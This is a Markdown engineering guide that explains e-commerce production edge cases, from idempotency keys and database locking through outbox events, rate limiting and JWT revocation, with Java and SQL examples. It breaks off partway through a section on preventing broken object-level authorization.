# E-commerce Production Edge Cases
### Senior-Level Code Review: Problem → Solution → Trade-offs → Why This Way

> 30 edge cases. Each one has caused a real production incident somewhere.
> Written the way a senior engineer explains a PR review — not just "what" but "why this approach
> over the alternatives," and what you give up when you choose it.

---

## Original 20 Cases (Quick Reference)

| # | Case | Key Mechanism |
|---|------|---------------|
| 1 | Idempotency | Client key + DB UNIQUE |
| 2 | Optimistic Locking | `@Version` + retry |
| 3 | Pessimistic Lock (payment) | `SELECT FOR UPDATE` |
| 4 | Price Snapshot | Store at add-to-cart, validate at checkout |
| 5 | Reservation TTL | Scheduled expiry job |
| 6 | Soft Delete | `is_active` flag |
| 7 | Concurrent Cart Lock | `SELECT FOR UPDATE` |
| 8 | Order State Machine | Enum + `validateTransitionTo()` |
| 9 | Duplicate Payment | DB `UNIQUE(order_id)` |
| 10 | Refund State Machine | State-based idempotency |
| 11 | Outbox Pattern | Same-TX event + background poller |
| 12 | Rate Limiting | AOP fixed-window |
| 13 | Read-after-Write | `@Transactional(readOnly=true)` |
| 14 | Atomic SQL Decrement | `UPDATE WHERE qty >= N` |
| 15 | JWT Token Version | `token_version` column |
| 16 | Address Ownership | Service-layer BOLA check |
| 17 | Checkout Atomicity | Single `@Transactional` |
| 18 | Notification Dedup | App check + DB UNIQUE |
| 19 | Graceful Shutdown | `server.shutdown: graceful` |
| 20 | Input Sanitization | Parameterized queries + Bean Validation |

> The full explanations with execution flows for cases 1–20 are directly below.

---

## Cases #1–#20 — Full Execution Flows

---

## Edge Case #1 — Idempotency Key (Duplicate Order Submission)

### The Problem
A user clicks "Place Order" on a slow connection. The server processes the order, but the
HTTP response is lost in transit (network hiccup, mobile app killed, etc.). The client
never sees a success response, so it retries — sending the same order again. Without
protection you now have **two identical orders** charged to the same customer.

This is the most financially dangerous silent failure in e-commerce. The customer doesn't
know they placed two orders. The first they learn of it is when two packages arrive — or
when they see two charges on their bank statement.

### Execution Flow

```
Client                          Server                          Database
  │                               │                                │
  ├─── POST /orders/checkout ─────►│                               │
  │    {idempotencyKey: "abc-123"} │                               │
  │                               ├─── SELECT * FROM orders ──────►│
  │                               │    WHERE idempotency_key =     │
  │                               │    'abc-123'                   │
  │                               │◄─── (no rows found) ───────────┤
  │                               │                                │
  │                               ├─── INSERT INTO orders ─────────►│
  │                               │    (idempotency_key='abc-123') │
  │                               │◄─── order created (id=99) ─────┤
  │◄─── 201 Created ──────────────┤                                │
  │     {orderId: 99}             │                                │
  │                               │                                │
  │  [network hiccup — client     │                                │
  │   never receives response]    │                                │
  │                               │                                │
  ├─── POST /orders/checkout ─────►│  (RETRY — same key)           │
  │    {idempotencyKey: "abc-123"} │                               │
  │                               ├─── SELECT * FROM orders ──────►│
  │                               │    WHERE idempotency_key =     │
  │                               │    'abc-123'                   │
  │                               │◄─── order row found (id=99) ───┤
  │◄─── 200 OK (idempotent) ──────┤                                │
  │     {orderId: 99}             │  (NO new order created)        │
```

### The Solution
```java
// DB schema: UNIQUE constraint is the real guard
// idempotency_key VARCHAR(64) UNIQUE NOT NULL

public OrderResponse checkout(UUID userId, CheckoutRequest req) {
    // 1. Check if this key was already processed
    return orderRepo.findByIdempotencyKey(req.idempotencyKey())
        .map(existing -> buildResponse(existing))  // return cached result
        .orElseGet(() -> createNewOrder(userId, req));  // first time only
}
```

### Why This Approach?
**The UNIQUE constraint IS the guard** — not the SELECT. If two concurrent requests with
the same key slip through the `findByIdempotencyKey` check simultaneously, only one INSERT
will succeed. The other gets `DataIntegrityViolationException` → caught → return the
successfully inserted order.

**Alternative: Time-window deduplication**
> "Reject orders that look the same within 5 minutes."

❌ **False positives.** A user who legitimately orders the same product twice in 5 minutes
is rejected. Keys are explicit: the client opts in to idempotency.

**Trade-off:** The client must generate and persist the key before the request. If the client
crashes before persisting the key, it has no way to reconstruct it — it must generate a
new one and accept the risk of duplication. This is acceptable: it's the client's responsibility.

---

## Edge Case #2 — Optimistic Locking (Concurrent Product Updates)

### The Problem
Two admin users both open the same product's edit page. Admin A changes the price to $99.
Admin B (whose screen still shows the old price) changes the description and saves.
Admin B's save also overwrites Admin A's price change — **the last write wins silently**,
and Admin A's change is lost forever without any error.

This is the classic "Lost Update" problem in concurrent systems.

### Execution Flow

```
Time    Admin A                          DB                      Admin B
  │     GET product (version=1)          │                         │
  │                                      │     GET product (version=1)
  │     [changes price to $99]           │                         │
  │                                      │     [changes description]
  │     UPDATE products                  │                         │
  │     SET price=99, version=2          │                         │
  │     WHERE id=X AND version=1 ───────►│                         │
  │     (1 row affected — success) ◄─────┤                         │
  │                                      │                         │
  │                                      │     UPDATE products     │
  │                                      │     SET desc=..., version=2
  │                                      │     WHERE id=X AND version=1 ◄──
  │                                      │     (0 rows — version mismatch!)
  │                                      │     ────────────────────►│
  │                                      │     409 Conflict         │
  │                                      │                         │
  │                               Admin B must re-fetch and re-apply │
```

### The Solution
```java
@Entity
public class ProductEntity {
    @Version
    private Long version;  // Hibernate manages this automatically
}

// Hibernate generates: UPDATE products SET price=?, version=? WHERE id=? AND version=?
// If WHERE version=? matches 0 rows → throws OptimisticLockingFailureException
```
The service catches `OptimisticLockingFailureException` → retries up to 3 times with a
short backoff. If still failing after 3 retries, returns 409 Conflict to the client.

**Trade-off:** Under high contention (many concurrent writes), retries add latency.
This is by design — optimistic locking is best when conflicts are rare. If conflicts are
frequent (hot product under a flash sale), switch to pessimistic locking (`SELECT FOR UPDATE`)
for that specific operation.

---

## Edge Case #3 — Pessimistic Lock for Payment (Double Charge Prevention)

### The Problem
Two parallel payment service calls for the same order (retry + original both arrive at
the payment service simultaneously). Without a lock, both read `payment_status = PENDING`,
both proceed to charge the customer's card — **customer is charged twice**.

This is worse than a lost update: it's financial fraud from the customer's perspective.

### Execution Flow

```
Thread A (original request)          DB                  Thread B (retry)
  │                                   │                        │
  ├── BEGIN TRANSACTION ──────────────►                        │
  ├── SELECT * FROM payments          │                        │
  │   WHERE order_id = X             │                        │
  │   FOR UPDATE ─────────────────────►                        │
  │   (acquires row lock) ◄───────────┤                        │
  │                                   │   BEGIN TRANSACTION ───►│
  │                                   │   SELECT * FROM payments│
  │                                   │   WHERE order_id = X   │
  │                                   │   FOR UPDATE ──────────►│
  │                                   │   (BLOCKS — waits) ◄───┤
  ├── status = PENDING ✓              │                        │
  ├── call payment gateway            │                        │
  ├── UPDATE payments SET             │                        │
  │   status = COMPLETED ─────────────►                        │
  ├── COMMIT ─────────────────────────►                        │
  │                                   │   (lock released)       │
  │                                   │   Thread B acquires     │
  │                                   │   lock ────────────────►│
  │                                   │   reads status=COMPLETED│
  │                                   │   → skips charge ◄──────┤
  │                                   │   COMMIT ──────────────►│
```

### The Solution
```java
@Lock(LockModeType.PESSIMISTIC_WRITE)
@Query("SELECT p FROM PaymentEntity p WHERE p.orderId = :orderId")
Optional<PaymentEntity> findByOrderIdForUpdate(@Param("orderId") UUID orderId);

public PaymentResponse processPayment(UUID orderId) {
    PaymentEntity payment = paymentRepo.findByOrderIdForUpdate(orderId)
        .orElseThrow(() -> new PaymentNotFoundException(orderId));
    
    if (payment.getStatus() != PaymentStatus.PENDING) {
        return buildIdempotentResponse(payment);  // already processed — return safely
    }
    
    // At this point only ONE thread can be here for this orderId
    String chargeId = gateway.charge(payment.getAmount());
    payment.setStatus(PaymentStatus.COMPLETED);
    payment.setGatewayChargeId(chargeId);
    return buildResponse(payment);
}
```

**Trade-off:** All payment requests for the same order are serialized. This is intentional —
correctness over throughput. Different orders don't block each other (lock is per-row).

---

## Edge Case #4 — Price Snapshot (Cart Price Drift)

### The Problem
A user adds an item to cart at $50. While they browse, the admin raises the price to $80.
The user checks out. What price do they pay?

- **Always live price:** User pays $80. Legally grey in many jurisdictions ("I added it at $50!").
- **Always cart price:** Admin cannot correct a pricing mistake once any user has the item in cart.
- **Snapshot + validation:** Store $50 at add-time. Warn at checkout if price has changed.

### Execution Flow

```
User                             App                              DB
  │                               │                               │
  ├─── Add to cart ──────────────►│                               │
  │                               ├─── SELECT price FROM products►│
  │                               │◄─── price = $50.00 ───────────┤
  │                               ├─── INSERT INTO cart_items ───►│
  │                               │    (product_id, unit_price=$50)│
  │◄─── Cart shows $50.00 ────────┤                               │
  │                               │                               │
  │  [Admin raises price to $80]  │                               │
  │                               │                               │
  ├─── Proceed to checkout ──────►│                               │
  │                               ├─── SELECT current price ─────►│
  │                               │◄─── price = $80.00 ───────────┤
  │                               │                               │
  │                               │  cart_price ($50) ≠           │
  │                               │  current_price ($80)          │
  │                               │                               │
  │◄─── 409 PriceChangedException─┤                               │
  │     "Price changed: $50→$80.  │                               │
  │      Refresh to continue."    │                               │
```

### The Solution
```java
// 1. Snapshot at add-to-cart time
cartItem.setUnitPrice(product.getPrice());  // stored in cart_items.unit_price

// 2. Validate at checkout — BEFORE any payment
for (CartItem item : cart.getItems()) {
    BigDecimal currentPrice = productRepo.getCurrentPrice(item.getProductId());
    if (item.getUnitPrice().compareTo(currentPrice) != 0) {
        throw new PriceChangedException(item, currentPrice);
    }
}
```

**Why compareTo, not equals?** `BigDecimal("50.0").equals(BigDecimal("50.00"))` is `false`
because equals also compares scale. `compareTo` compares value only.

**Trade-off:** Users must re-confirm their cart on price changes, adding friction.
This is the legally and user-experience correct trade-off in most markets.

---

## Edge Case #5 — Reservation TTL (Inventory Hold Expiry)

### The Problem
A user adds 5 laptops to cart. They browse for 2 hours without checking out. Meanwhile,
10 other users can't buy those laptops because they appear "reserved." Eventually the user
closes the browser tab without checking out — **5 laptops are permanently stuck in reserved
state**, unavailable to anyone.

### Execution Flow

```
User                         Scheduler                         DB
  │                               │                             │
  ├─ Add to cart ─────────────────────────────────────────────►│
  │  (reservation created,        │                             │
  │   expires_at = NOW + 30min)   │                             │
  │                               │                             │
  │  [user browses, 30 min pass]  │                             │
  │                               │                             │
  │               ┌───────────────┤                             │
  │               │ @Scheduled    │                             │
  │               │ (every 5min)  ├─ SELECT * FROM reservations►│
  │               │               │  WHERE expires_at < NOW()  │
  │               │               │  AND status = 'RESERVED'   │
  │               │               │◄─ [5 laptop reservations] ──┤
  │               │               │                             │
  │               │               ├─ UPDATE inventory ──────────►│
  │               │               │  SET reserved = reserved - 5│
  │               │               ├─ UPDATE reservations ───────►│
  │               │               │  SET status = 'EXPIRED'    │
  │               └───────────────┤                             │
  │                               │                             │
  │  [Other users can now buy     │                             │
  │   the 5 laptops again]        │                             │
```

### The Solution
```java
@Scheduled(fixedDelay = 300_000)  // every 5 minutes
@Transactional
public void expireReservations() {
    List<InventoryReservation> expired = reservationRepo
        .findByStatusAndExpiresAtBefore(ReservationStatus.RESERVED, Instant.now());
    
    for (InventoryReservation res : expired) {
        inventoryRepo.releaseReservation(res.getProductId(), res.getQuantity());
        res.setStatus(ReservationStatus.EXPIRED);
    }
}
```

**Why polling instead of scheduled per-reservation?**
A per-reservation `ScheduledFuture` (one timer per cart item) requires in-memory state
that's lost on server restart. A DB-backed polling job is crash-safe — on restart, it
immediately finds and expires all overdue reservations.

**Trade-off:** Up to 5-minute lag before expired reservations are released. For flash
sales this matters; reduce the interval to 1 minute if needed (monitors DB load).

---

## Edge Case #6 — Soft Delete (Product Deactivation)

### The Problem
Admin deletes a product. But:
- There are open orders referencing that product via `order_items.product_id`
- There are customer reviews attached to that `product_id`
- Financial records require the product data for audits (7-year retention law)

A `DELETE FROM products WHERE id = X` would either:
- Fail with FK constraint violation (if FK constraints enforce referential integrity)
- Cascade-delete all orders/reviews (catastrophic data loss)
- Break audit history

### Execution Flow

```
Admin                           App                              DB
  │                              │                               │
  ├─ DELETE /products/123 ──────►│                               │
  │                              ├─ productRepo.softDelete(123)─►│
  │                              │  UPDATE products              │
  │                              │  SET is_active = false,       │
  │                              │      deleted_at = NOW()       │
  │                              │  WHERE id = 123               │
  │◄─ 200 OK ─────────────────── ┤                               │
  │                              │                               │
  │  [Catalog page]              │                               │
  │                              ├─ findAll(active only) ───────►│
  │                              │  SELECT * FROM products       │
  │                              │  WHERE is_active = true       │
  │                              │◄─ (product 123 not returned) ─┤
  │                              │                               │
  │  [Order history]             │                               │
  │                              ├─ findByOrderId ──────────────►│
  │                              │  SELECT * FROM order_items    │
  │                              │  JOIN products ON product_id  │
  │                              │◄─ (product 123 still found    │
  │                              │    for historical display) ───┤
```

### The Solution
```java
@Entity
public class ProductEntity {
    @Column(nullable = false)
    private boolean isActive = true;
    
    private Instant deletedAt;
}

// All catalog queries filter on is_active:
@Query("SELECT p FROM ProductEntity p WHERE p.isActive = true")
List<ProductEntity> findAllActive();
```

Add a partial index for performance:
```sql
CREATE INDEX idx_products_active ON products(id) WHERE is_active = true;
```
Queries with `WHERE is_active = true` use this index — inactive products are excluded
from the index entirely, so they add zero overhead to catalog reads.

**Trade-off:** Ghost rows accumulate over time. Periodic archival jobs can move
`is_active=false` rows older than N years to a cold storage table.

---

## Edge Case #7 — Concurrent Cart Lock (Cart Quantity Race)

### The Problem
User clicks "+" on a cart item to increase quantity. Their slow network causes a double-click,
sending two concurrent `PATCH /cart/items/{id}` requests. Both read `quantity = 2`.
Both increment to `3`. Both save `quantity = 3`. **The actual result: quantity = 3, not 4.**

### Execution Flow

```
Request A                        DB                     Request B
  │                               │                          │
  ├─ SELECT * FROM cart_items     │                          │
  │  WHERE id=X FOR UPDATE ──────►│                          │
  │  (lock acquired) ◄────────────┤                          │
  │                               │   SELECT * FROM cart_items
  │                               │   WHERE id=X FOR UPDATE ─►│
  │                               │   (BLOCKS — waits) ◄──────┤
  ├─ read quantity=2              │                          │
  ├─ UPDATE SET quantity=3 ──────►│                          │
  ├─ COMMIT ──────────────────────►                          │
  │                               │   (lock released)        │
  │                               │   Request B acquires lock►│
  │                               │   reads quantity=3       │
  │                               │   UPDATE SET quantity=4 ─►│
  │                               │   COMMIT ────────────────►│
  │                               │                          │
  │                 Final quantity = 4 (CORRECT) ✓           │
```

### The Solution
```java
@Lock(LockModeType.PESSIMISTIC_WRITE)
@Query("SELECT c FROM CartItemEntity c WHERE c.id = :id")
Optional<CartItemEntity> findByIdForUpdate(@Param("id") UUID id);
```

The `FOR UPDATE` lock serializes concurrent modifications to the same cart item.
The second request waits for the first to complete, then reads the updated value and
applies its change on top of it correctly.

**Trade-off:** Concurrent edits to the same cart item are serialized (one waits for the other).
This is almost always the correct behavior — a user adding quantity should be sequential.

---

## Edge Case #8 — Order State Machine (Invalid Status Transitions)

### The Problem
An order goes through: `PENDING → CONFIRMED → SHIPPED → DELIVERED`.
Without enforcement, a bug in a payment webhook could directly set a `DELIVERED` order back
to `PENDING`. A refund handler could trigger on a `CANCELLED` order. Support tools could
accidentally cancel a `DELIVERED` order.

Invalid transitions don't just corrupt data — they trigger cascading side effects
(re-issuing notifications, incorrect inventory adjustments, wrong financial entries).

### Execution Flow

```
[Valid transition]
PENDING ──► CONFIRMED ──► SHIPPED ──► DELIVERED
                                          │
                                     COMPLETED or
                                     REFUND_REQUESTED

[Invalid transition — BLOCKED]
DELIVERED ──X──► PENDING
                 "Cannot transition from DELIVERED to PENDING"
```

### The Solution
```java
public enum OrderStatus {
    PENDING, CONFIRMED, SHIPPED, DELIVERED, COMPLETED,
    CANCELLED, REFUND_REQUESTED, REFUNDED;

    private static final Map<OrderStatus, Set<OrderStatus>> VALID_TRANSITIONS = Map.ofEntries(
        Map.entry(PENDING,           Set.of(CONFIRMED, CANCELLED)),
        Map.entry(CONFIRMED,         Set.of(SHIPPED, CANCELLED)),
        Map.entry(SHIPPED,           Set.of(DELIVERED)),
        Map.entry(DELIVERED,         Set.of(COMPLETED, REFUND_REQUESTED)),
        Map.entry(REFUND_REQUESTED,  Set.of(REFUNDED, CONFIRMED)),
        Map.entry(COMPLETED,         Set.of()),
        Map.entry(CANCELLED,         Set.of()),
        Map.entry(REFUNDED,          Set.of())
    );

    public void validateTransitionTo(OrderStatus next) {
        if (!VALID_TRANSITIONS.get(this).contains(next)) {
            throw new InvalidOrderTransitionException(this, next);
        }
    }
}

// Usage in service:
order.getStatus().validateTransitionTo(newStatus);  // throws if invalid
order.setStatus(newStatus);
```

**Trade-off:** Every new business requirement (e.g., "allow re-opening a COMPLETED order")
requires adding a new valid transition. This is a **feature**, not a bug — it forces
explicit business approval before a new path is allowed.

---

## Edge Case #9 — Duplicate Payment (Payment Webhook Dedup)

### The Problem
Payment gateways (Stripe, VNPay) often deliver webhooks multiple times for the same
event ("at-least-once delivery"). If the first webhook delivery succeeds but the response
is slow (network hiccup), the gateway retries the webhook. Your handler processes the
same payment completion event twice — charging the customer's card twice.

### Execution Flow

```
Gateway                         App                              DB
  │                               │                               │
  ├─ POST /webhooks/payment ──────►│                               │
  │  {chargeId: "ch_abc123",      │                               │
  │   status: "completed"}        ├─── INSERT INTO payments ──────►│
  │                               │    (charge_id='ch_abc123',    │
  │                               │     status=COMPLETED)         │
  │  [response slow...]           │◄─── INSERT OK ────────────────┤
  │                               │                               │
  │  [Gateway assumes failure,    │                               │
  │   retries after 5 seconds]    │                               │
  │                               │                               │
  ├─ POST /webhooks/payment ──────►│                               │
  │  {chargeId: "ch_abc123", ...} │                               │
  │                               ├─── INSERT INTO payments ──────►│
  │                               │    UNIQUE(charge_id) violated │
  │                               │◄─── DataIntegrityViolation ───┤
  │                               │                               │
  │                               │  catch → return 200 OK        │
  │◄─── 200 OK ───────────────────┤  (gateway stops retrying)     │
  │                               │  No double charge ✓           │
```

### The Solution
```sql
-- Schema-level deduplication
ALTER TABLE payments ADD CONSTRAINT payments_charge_id_unique UNIQUE (gateway_charge_id);
```
```java
try {
    paymentRepo.save(newPayment);
} catch (DataIntegrityViolationException e) {
    if (isUniqueConstraintViolation(e)) {
        log.info("Duplicate webhook for chargeId={}, ignoring", chargeId);
        return;  // idempotent — success
    }
    throw e;
}
```

**Why return 200 to the gateway?** If you return 4xx or 5xx on a duplicate, the gateway
retries indefinitely (it doesn't know the duplicate was intentional). Return 200 to
signal "received and processed" — the gateway stops retrying.

**Trade-off:** Requires catching `DataIntegrityViolationException` — a generic exception
that could mask real errors. The `isUniqueConstraintViolation()` helper inspects the
SQL state code (`23505` in PostgreSQL) to confirm it's specifically a unique violation.

---

## Edge Case #10 — Refund State Machine (Concurrent Refund Prevention)

### The Problem
A customer submits a refund request. Their support agent also initiates a refund from the
admin panel simultaneously. Two concurrent refund requests reach the service. Without
protection, both pass the `status = DELIVERED` check and two refunds are issued —
**double refund to the customer, double loss to the business**.

### Execution Flow

```
State Machine:
  DELIVERED ──► REFUND_REQUESTED ──► REFUNDED
                     │
                     └──► REFUND_FAILED (→ human review)

Concurrent requests:
  Thread A                         DB                     Thread B
  │                                 │                          │
  ├─ SELECT FOR UPDATE order ──────►│                          │
  │  (lock acquired)                │                          │
  │                                 │  Thread B blocks at      │
  │                                 │  SELECT FOR UPDATE ───────►│
  ├─ status = DELIVERED ✓           │                          │
  ├─ UPDATE status=REFUND_REQUESTED►│                          │
  ├─ call gateway.refund()          │                          │
  ├─ UPDATE status=REFUNDED ───────►│                          │
  ├─ COMMIT ───────────────────────►│                          │
  │                                 │  Thread B acquires lock ─►│
  │                                 │  status = REFUNDED ≠ DELIVERED
  │                                 │  → throws InvalidTransition │
  │                                 │  → 409 Conflict ◄──────────┤
```

### The Solution
```java
// State machine prevents the transition:
// REFUNDED.validateTransitionTo(REFUND_REQUESTED) → throws InvalidOrderTransitionException

// Pessimistic lock prevents the race:
OrderEntity order = orderRepo.findByIdForUpdate(orderId);
order.getStatus().validateTransitionTo(OrderStatus.REFUND_REQUESTED);
// From this point, only one thread processes the refund
```

**Trade-off:** `REFUND_FAILED` is a terminal state requiring human review — the system
cannot automatically retry a failed refund (the gateway might have partially processed it).
An alert fires when any order reaches `REFUND_FAILED`; ops investigates and re-triggers manually.

---

## Edge Case #11 — Outbox Pattern (Reliable Event Publishing)

### The Problem
After a successful checkout, you need to:
1. Send an order confirmation email
2. Update analytics
3. Notify the warehouse system

Naive approach:
```java
@Transactional
public void checkout() {
    saveOrder();           // DB write — succeeds
    emailService.send();   // HTTP call — FAILS (email provider down)
    // Transaction is rolled back? No — DB already committed above.
    // Email never sent, order exists, customer never notified.
}
```

Or the reverse: `emailService.send()` succeeds, then `saveOrder()` fails — an email
is sent for an order that doesn't exist.

### Execution Flow

```
Checkout (single transaction):              Outbox Poller (background):
                                            [runs every 500ms]
  ┌─────────────────────────────┐
  │  BEGIN TRANSACTION          │           ┌─────────────────────────────┐
  │  INSERT INTO orders ...     │           │  SELECT * FROM outbox_msgs  │
  │  INSERT INTO outbox_messages│           │  WHERE status = 'PENDING'   │
  │  {type:'ORDER_CREATED',     │   ───►    │  LIMIT 10                   │
  │   payload: {...},           │           │                             │
  │   status: 'PENDING'}        │           │  For each message:          │
  │  COMMIT ✓                   │           │    call email/notification  │
  └─────────────────────────────┘           │    service                  │
                                            │    UPDATE status='PUBLISHED'│
  If email service is down at              │                             │
  checkout time — order still             │  If service fails:           │
  saves. Poller retries the email          │    retry_count++             │
  when it comes back online.              │    next_retry_at = NOW +     │
                                            │    exponential_backoff       │
                                            └─────────────────────────────┘
```

### The Solution
```java
@Transactional
public CheckoutResponse checkout(UUID userId, CheckoutRequest req) {
    OrderEntity order = createOrder(userId, req);
    
    // Write the "intent to notify" in the SAME transaction as the order
    OutboxMessage msg = OutboxMessage.of("ORDER_CREATED", order.getId(), buildPayload(order));
    outboxRepo.save(msg);
    
    return buildResponse(order);  // transaction commits both order + outbox message atomically
}
```

**Trade-off:** Notifications are delivered ~500ms after the order is saved (polling interval),
not synchronously. For order confirmation emails, this is acceptable. For real-time
in-app notifications, reduce the polling interval or use `LISTEN/NOTIFY` (PostgreSQL
push mechanism) to wake the poller immediately.

---

## Edge Case #12 — Rate Limiting (Preventing Abuse)

### The Problem
A malicious bot (or a poorly-written third-party integration) hammers your product search
endpoint 10,000 times per minute. Without rate limiting:
- DB connection pool exhausted → all users get errors
- Search indexes thrashed → degraded performance for everyone
- Competitor scraping your entire product catalog

### Execution Flow

```
Client                          AOP RateLimitAspect              DB
  │                               │                               │
  ├─ GET /products/search ────────►│                               │
  │  [1st request]                ├─ check counter for IP/user   │
  │                               │  counter = 0 → allow         │
  │                               │  counter++ (counter=1)       │
  │◄─ 200 OK ─────────────────────┤                               │
  │                               │                               │
  ├─ GET /products/search ─ (×98)─►│                               │
  │  [requests 2–99]              │  counter = 98 → allow        │
  │                               │  counter++ each time         │
  │◄─ 200 OK ─────────────────────┤                               │
  │                               │                               │
  ├─ GET /products/search ────────►│                               │
  │  [100th request in 1 minute]  ├─ counter = 99 → ALLOW        │
  │                               │  counter++ (counter=100)     │
  │◄─ 200 OK ─────────────────────┤                               │
  │                               │                               │
  ├─ GET /products/search ────────►│                               │
  │  [101st request in 1 minute]  ├─ counter = 100 → REJECT      │
  │◄─ 429 Too Many Requests ──────┤                               │
  │   Retry-After: 47s            │                               │
```

### The Solution
```java
@Aspect
@Component
public class RateLimitAspect {
    private final Map<String, RateLimitEntry> store = new ConcurrentHashMap<>();

    @Around("@annotation(rateLimited)")
    public Object enforce(ProceedingJoinPoint pjp, RateLimited rateLimited) {
        String key = buildKey(request);  // userId or IP
        RateLimitEntry entry = store.computeIfAbsent(key, k -> new RateLimitEntry());
        
        if (entry.isExceeded(rateLimited.maxRequests(), rateLimited.windowSeconds())) {
            throw new RateLimitExceededException(entry.getRetryAfterSeconds());
        }
        
        return pjp.proceed();
    }
}
```

**Usage:**
```java
@GetMapping("/products/search")
@RateLimited(maxRequests = 100, windowSeconds = 60)
public Page<ProductResponse> search(...) { ... }
```

**Trade-off:** This is an in-memory, single-JVM implementation. With 3 app servers, a user
gets 100 requests per server = 300 per minute across the cluster. For production multi-instance
setups, replace the `ConcurrentHashMap` with a Redis counter (`INCR` + `EXPIRE`).

---

## Edge Case #13 — Read-After-Write Consistency

### The Problem
User updates their shipping address. The app saves the update (write goes to primary DB),
then immediately fetches their profile to show a confirmation page. With read replicas,
the fetch goes to a replica that hasn't received the replication yet — **the user sees
their OLD address on the confirmation page**, thinking the update didn't save.

This erodes user trust. The user re-submits → creates duplicate update → potentially
checkout goes to the wrong old address.

### Execution Flow

```
Without fix:
  User                  App                  Primary DB       Replica DB
    │  PUT /profile ─────►│                       │                │
    │                     ├─── UPDATE ────────────►│                │
    │                     │◄─── OK ───────────────┤                │
    │  GET /profile ──────►│                       │   [replication lag ~100ms]
    │                     ├─── SELECT ─────────────────────────────►│
    │                     │◄─── OLD DATA ──────────────────────────┤
    │◄── Shows old address ┤                       │                │
    │                     │                       │                │
With fix (sticky read):
    │  PUT /profile ─────►│                       │                │
    │                     ├─── UPDATE ────────────►│                │
    │  GET /profile ──────►│  [same request context]               │
    │                     ├─── SELECT ────────────►│  (reads from primary)
    │                     │◄─── NEW DATA ──────────┤                │
    │◄── Shows new address ┤                       │                │
```

### The Solution
```java
// Mark write operations — subsequent reads in the same request go to primary
@Transactional  // read-write → connects to primary
public UserProfile updateProfile(UUID userId, UpdateProfileRequest req) {
    UserProfile profile = userRepo.findById(userId).orElseThrow();
    profile.update(req);
    return userRepo.save(profile);
}

// For pure reads, explicitly route to replica:
@Transactional(readOnly = true)  // → can route to replica
public UserProfile getProfile(UUID userId) {
    return userRepo.findById(userId).orElseThrow();
}
```

In the controller, `updateProfile` returns the saved entity directly — no second fetch needed.

**Trade-off:** `@Transactional(readOnly=true)` is a hint to the routing infrastructure.
Without a read/write routing data source (like Spring's `AbstractRoutingDataSource`), this
only helps Hibernate optimize (no flush, no dirty checking). For full read-replica routing,
configure a `ReadWriteRoutingDataSource`.

---

## Edge Case #14 — Atomic SQL Decrement (Flash Sale Inventory)

### The Problem
Flash sale: 100 units of a product. 500 users simultaneously click "Buy."
Naive approach:
```java
Product product = productRepo.findById(id);  // reads stock=100
if (product.getStock() > 0) {               // all 500 pass this check
    product.setStock(product.getStock() - 1);
    productRepo.save(product);              // all 500 write... result: stock=-400
}
```
The `read-check-write` pattern has a race condition window of microseconds — enough
for all 500 concurrent requests to pass the check simultaneously.

### Execution Flow

```
500 concurrent requests for the same product (stock=100):

Naive (WRONG):                        Atomic SQL (CORRECT):
  All 500 read stock=100              SQL: UPDATE products
  All 500 check stock > 0 → PASS           SET stock = stock - 1
  All 500 write stock = 99            WHERE id = X AND stock >= 1
  Result: stock = 99 (lost updates!)
                                      DB executes this atomically.
  Or with optimistic locking:         100 requests succeed (affected=1).
  500 reads, 499 retries...           400 requests get affected=0
  "thundering herd" — a storm of      → throw InsufficientStockException.
  retries all competing, many
  failing again → cascading retries   No thundering herd.
                                      Linear performance.
```

### The Solution
```java
@Modifying
@Query("""
    UPDATE ProductEntity p SET p.stock = p.stock - :quantity
    WHERE p.id = :productId AND p.stock >= :quantity
    """)
int decrementStock(@Param("productId") UUID productId, @Param("quantity") int quantity);

// In service:
int rowsAffected = productRepo.decrementStock(productId, quantity);
if (rowsAffected == 0) {
    throw new InsufficientStockException(productId, quantity);
}
```

**Why `AND p.stock >= :quantity` in the WHERE clause?**
The check and the decrement happen as a single atomic DB operation. No other transaction
can read and modify `stock` between the check and the update — it's one statement.

**Trade-off:** The `@Version` field on `ProductEntity` becomes stale after this update
(Hibernate didn't increment it). If you use both `@Version` and `@Modifying` updates on
the same entity in the same request, you may get `OptimisticLockingFailureException`.
Solution: use `@Modifying` for inventory, `@Version` for product metadata — never both
on the same field.

---

## Edge Case #15 — JWT Token Version (Immediate Token Revocation)

### The Problem
A user reports their account was compromised. You change their password. But their old
JWT token is still valid for another 23 hours — a thief with the stolen token can continue
making requests for 23 hours after the password change.

Standard JWT has **no revocation mechanism** — once issued, a token is valid until it expires.

### Execution Flow

```
Attacker                        App                              DB
  │                               │                               │
  │  [steals token, version=3]    │                               │
  │                               │                               │
  │  User resets password ─────────────────────────────────────►  │
  │                               │  UPDATE users                 │
  │                               │  SET token_version = 4 ──────►│
  │                               │                               │
  ├─ GET /orders (stolen token) ──►│                               │
  │  {userId: X, version: 3}      │                               │
  │                               ├─ SELECT token_version ───────►│
  │                               │  FROM users WHERE id = X      │
  │                               │◄─ token_version = 4 ──────────┤
  │                               │                               │
  │                               │  token.version (3) ≠          │
  │                               │  db.version (4) → REJECT      │
  │◄─ 401 Unauthorized ───────────┤                               │
  │   "Token revoked"             │                               │
```

### The Solution
```java
// Token claim includes version:
// {sub: "userId", version: 3, exp: ...}

// JWT filter validation:
public boolean validateToken(String token) {
    Claims claims = Jwts.parser().parseClaimsJws(token).getBody();
    int tokenVersion = claims.get("version", Integer.class);
    
    // DB lookup (cached in Redis for performance):
    int currentVersion = userRepo.getTokenVersion(claims.getSubject());
    
    return tokenVersion == currentVersion;
}

// On password change / logout-all:
userRepo.incrementTokenVersion(userId);  // invalidates ALL existing tokens
```

**Trade-off:** Every JWT validation requires a DB (or cache) lookup — JWT's "stateless"
advantage is partially lost. Mitigate with a Redis cache of token versions with a short
TTL (60 seconds). The 60-second window is acceptable: a revoked attacker can still
make requests for 60 seconds (vs. 23 hours without this mechanism).

---

## Edge Case #16 — Address Ownership (BOLA — Broken Object Level Authorization)

### The Problem
BOLA (Broken Object Level Authorization — OWASP API Top 10 #1) is the most exploited
API vulnerability. The attack:

```
User Alice (id=1) has address id=5
User Bob (id=2) makes request:
  DELETE /users/1/addresses/5
  Authorization: Bearer <bob's token>
```

If the service only checks "is the user authenticated?" without checking "does this user
OWN address 5?", Bob can delete Alice's address. Or worse, read Alice's shipping history.

### Execution Flow

```
Bob                             App                              DB
  │                               │                               │
  ├─ DELETE /addresses/5 ─────────►│                               │
  │  (Bob's JWT: userId=2)        │                               │
  │                               ├─ findById(5) ────────────────►│
  │                               │◄─ address {id=5, userId=1} ───┤
  │                               │                               │
  │                               │  address.userId (1) ≠         │
  │                               │  jwtUserId (2)                │
  │                               │  → throw ForbiddenException   │
